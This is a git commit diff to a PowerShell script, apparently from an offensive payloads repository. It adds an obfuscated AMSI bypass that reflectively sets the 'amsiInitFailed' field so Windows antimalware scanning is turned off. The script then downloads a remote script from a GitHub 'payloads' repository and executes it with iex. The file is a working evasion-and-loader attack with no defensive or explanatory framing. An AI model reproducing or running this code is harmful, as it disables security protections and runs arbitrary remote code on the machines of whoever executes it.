bc3a3d37020972828e9edf8a38e2404cff22a9b1
in0d3 <114474229+in0d3@users.noreply.github.com>
2023-11-23 14:18:51 +0000

    Update posh_rev.ps1
    added amsi code as a test

--- posh_rev.ps1
+++ posh_rev.ps1
@@ -1,3 +1,8 @@
+$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
+$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
+$field.SetValue($null,$true)
+
 $p=iwr raw.githubusercontent.com/in0d3/payloads/main/posh_pay1.ps1
 sleep 3
 iex $p.rawcontent
